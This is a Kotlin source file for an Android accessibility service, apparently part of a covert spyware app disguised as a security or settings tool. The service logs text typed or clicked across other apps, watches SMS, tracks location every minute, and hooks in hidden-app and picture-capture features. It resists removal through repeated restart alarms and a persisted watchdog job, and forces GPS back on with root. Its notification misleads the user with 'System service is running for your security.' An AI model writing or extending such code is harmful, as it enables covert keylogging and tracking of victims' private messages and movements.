package com.safe.setting.app.services.accessibilityData

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.provider.Telephony
import android.text.TextUtils
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.safe.setting.app.R
import com.safe.setting.app.app.Hom
import com.safe.setting.app.receiver.RestartServiceReceiver
import com.safe.setting.app.services.sms.SmsObserver
import com.safe.setting.app.services.sms.SmsService
import com.safe.setting.app.services.watchdog.WatchdogJobService
import com.safe.setting.app.utils.ConstFun.enableGpsRoot
import com.safe.setting.app.utils.ConstFun.isRoot
import com.safe.setting.app.utils.Consts.TAG
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.inject.Inject

class AccessibilityDataService : AccessibilityService(), LocationListener {

    companion object {
        var isRunningService: Boolean = false
            private set
        const val NOTIFICATION_CHANNEL_ID = "AccessibilityServiceChannel"
        const val NOTIFICATION_ID = 2
    }

    @Inject
    lateinit var interactor: InteractorAccessibilityData

    private lateinit var locationManager: LocationManager
    private var smsObserver: SmsObserver? = null

    // ... (onCreate, onTaskRemoved, और अन्य फ़ंक्शन्स यहाँ वैसे ही रहेंगे) ...
    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.e(TAG, "TASK REMOVED, RESTARTING SERVICE...")
        val restartServiceIntent = Intent(applicationContext, this.javaClass)
        restartServiceIntent.setPackage(packageName)

        val restartServicePendingIntent = PendingIntent.getService(
            applicationContext, 1, restartServiceIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmService = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.set(
            AlarmManager.ELAPSED_REALTIME,
            SystemClock.elapsedRealtime() + 1000, // 1 सेकंड में रीस्टार्ट करें
            restartServicePendingIntent
        )
        super.onTaskRemoved(rootIntent)
    }

    override fun onCreate() {
        super.onCreate()
        try {
            Hom.appComponent.inject(this)
            Log.i(TAG, "AccessibilityDataService is being created.")
            scheduleRestartAlarm()
            scheduleWatchdogJob() // JobScheduler चौकीदार को शेड्यूल करें
        } catch (e: Exception) {
            Log.e(TAG, "Service Dagger injection failed: ${e.message}")
        }
    }

    private fun scheduleRestartAlarm() {
        val restartServiceIntent = Intent(applicationContext, RestartServiceReceiver::class.java)
        val restartServicePendingIntent = PendingIntent.getBroadcast(
            applicationContext, 100, restartServiceIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmService = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.setRepeating(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 1000,
            AlarmManager.INTERVAL_FIFTEEN_MINUTES,
            restartServicePendingIntent
        )
        Log.i(TAG, "AlarmManager Watchdog scheduled.")
    }

    private fun scheduleWatchdogJob() {
        val jobScheduler = getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
        val componentName = ComponentName(this, WatchdogJobService::class.java)
        val jobInfo = JobInfo.Builder(123, componentName)
            .setPeriodic(15 * 60 * 1000) // हर 15 मिनट में (न्यूनतम)
            .setPersisted(true) // रीबूट के बाद भी जारी रखें
            .build()

        if (jobScheduler.schedule(jobInfo) == JobScheduler.RESULT_SUCCESS) {
            Log.i(TAG, "JobScheduler Watchdog scheduled successfully.")
        } else {
            Log.e(TAG, "Failed to schedule JobScheduler Watchdog.")
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        isRunningService = true
        Log.i(TAG, "Accessibility service connected successfully.")

        startForeground(NOTIFICATION_ID, createNotification())

        Handler(Looper.getMainLooper()).postDelayed({
            try {
                Log.i(TAG, "Starting delayed initialization.")
                initializeServices()
                interactor.setRunServiceData(true)
                startSmsService()
            } catch (e: Exception) {
                Log.e(TAG, "Error in delayed onServiceConnected initialization: ${e.message}")
            }
        }, 500)
    }

    private fun initializeServices() {
        getLocation()
        interactor.getShowOrHideApp()
        interactor.getCapturePicture()
        registerSmsObserver()
    }

    private fun startSmsService() {
        val serviceIntent = Intent(this, SmsService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Log.i(TAG, "SmsService started from AccessibilityDataService.")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start SmsService: ${e.message}")
        }
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "Device Security",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }

        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle(getString(R.string.app_name))
            .setContentText("System service is running for your security.")
            .setSmallIcon(R.mipmap.c_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    @SuppressLint("SwitchIntDef")
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        try {
            val eventTypeString = when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "TEXT"
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> "FOCUSED"
                AccessibilityEvent.TYPE_VIEW_CLICKED -> "CLICKED"
                else -> null
            }

            eventTypeString?.let { type ->
                val textData = getEventText(event)
                if (textData.isNotEmpty()) {
                    val formattedData = "${getDateTime()} |($type)| $textData"
                    interactor.setDataKey(formattedData)
                    Log.i(TAG, formattedData)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing accessibility event: ${e.message}")
        }
    }

    private fun getEventText(event: AccessibilityEvent): String {
        val parentNodeInfo: AccessibilityNodeInfo? = event.source
        if (parentNodeInfo == null) {
            val eventText = event.text.toString()
            return if (eventText != "[]") eventText else ""
        }

        // स्रोत नोड और उसके सभी बच्चों (children) से टेक्स्ट को खोजने के लिए एक सहायक फ़ंक्शन का उपयोग करें
        val text = findTextInNode(parentNodeInfo)
        return text.trim()
    }

    private fun findTextInNode(nodeInfo: AccessibilityNodeInfo?): String {
        if (nodeInfo == null) return ""

        val builder = StringBuilder()

        if (!TextUtils.isEmpty(nodeInfo.text)) {
            builder.append(nodeInfo.text.toString()).append(" ")
        }

        for (i in 0 until nodeInfo.childCount) {
            val childNode = nodeInfo.getChild(i)
            if (childNode != null) {
                builder.append(findTextInNode(childNode))
            }
        }

        return builder.toString()
    }


    private fun getDateTime(): String {
        return try {
            SimpleDateFormat("yyyy-MM-dd hh:mm:aa", Locale.getDefault()).format(Date())
        } catch (e: Exception) { "Unknown-Time" }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted.")
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunningService = false
        try {
            interactor.setRunServiceData(false)
            interactor.clearDisposable()
            locationManager.removeUpdates(this)
            unregisterSmsObserver()
            Log.i(TAG, "AccessibilityDataService destroyed successfully.")
        } catch (e: Exception) {
            Log.e(TAG, "Error during service destruction: ${e.message}")
        }
    }

    private fun registerSmsObserver() {
        try {
            if (smsObserver == null) {
                smsObserver = SmsObserver(this, Handler(Looper.getMainLooper()))
                contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, smsObserver!!)
                Log.i(TAG, "SMS observer registered.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register SMS observer: ${e.message}")
        }
    }

    private fun unregisterSmsObserver() {
        try {
            smsObserver?.let {
                contentResolver.unregisterContentObserver(it)
                smsObserver = null
                Log.i(TAG, "SMS observer unregistered.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering SMS observer: ${e.message}")
        }
    }

    private fun getLocation() {
        try {
            locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                interactor.enablePermissionLocation(true)
                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 0f, this)
                Log.i(TAG, "Location updates requested.")
            } else {
                interactor.enablePermissionLocation(false)
                Log.w(TAG, "Location permission not granted.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error initializing location: ${e.message}")
            interactor.enablePermissionLocation(false)
        }
    }

    override fun onLocationChanged(location: Location) {
        interactor.setDataLocation(location)
    }

    override fun onProviderEnabled(provider: String) {
        if (provider == LocationManager.GPS_PROVIDER) {
            interactor.enableGps(true)
        }
    }

    override fun onProviderDisabled(provider: String) {
        if (provider == LocationManager.GPS_PROVIDER) {
            interactor.enableGps(false)
            // **** बदला हुआ कोड: टाइपो को ठीक किया गया ****
            Handler(Looper.getMainLooper()).postDelayed({
                if (isRoot()) enableGpsRoot()
            }, 3000)
        }
    }
}
